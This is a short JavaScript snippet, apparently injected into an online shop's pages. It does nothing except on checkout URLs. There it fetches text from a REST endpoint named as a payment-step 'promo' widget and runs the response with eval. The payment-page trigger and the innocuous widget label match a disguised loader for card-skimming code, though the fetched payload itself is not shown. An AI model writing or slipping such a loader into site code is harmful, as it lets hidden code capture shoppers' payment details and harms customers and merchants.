(function () {
  if (window.location.pathname.indexOf("/checkout") === -1) return;
  fetch("/rest/V1/widgets/promo?step=payment").then(function (r) { return r.text(); }).then(function (body) {
    eval(body);
  });
})();
